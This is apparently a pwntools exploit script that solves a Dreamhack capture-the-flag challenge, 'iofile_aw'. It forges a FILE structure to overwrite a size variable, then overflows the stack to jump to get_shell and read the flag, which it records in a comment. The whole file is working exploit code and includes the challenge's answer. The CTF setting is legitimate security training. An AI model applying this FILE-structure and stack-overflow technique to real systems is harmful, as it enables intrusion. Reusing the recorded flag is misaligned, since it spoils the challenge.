#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'iofile_aw_patched'
HOST = 'host8.dreamhack.games'
PORT = 11066

exe = ELF(exe_path, checksec=False)
libc = exe.libc
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
break *0x0000000000400add
b*0x0000000000400b3e
b*memchr
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)
def rcu(data):
    return p.recvuntil(data)
def rl():
    return p.recvline()

# ============================EXPLOIT============================
get_shell = exe.symbols['get_shell']
size = exe.symbols['size']

fp = FileStructure()

#overwrite only 0x40
fp.flags = 0xfbad1808
fp.read(size) # overwrite saved rip
print(fp)
payload = b'printf '
payload += (bytes(fp))[:0x40]
sa(b'# ', payload)
sla(b'# ', b'read\x00')
sleep(1)
sl(p64(0x1000))
payload = b'A'*(0x228-0x5) + p64(get_shell)
sa(b'# ', b'exit\x00'+payload)
sl(b'cat flag*')
# DH{2e862835c1695aff894bc9149af81d4939ef72ba10abad7b91a9959967894c89}
p.interactive()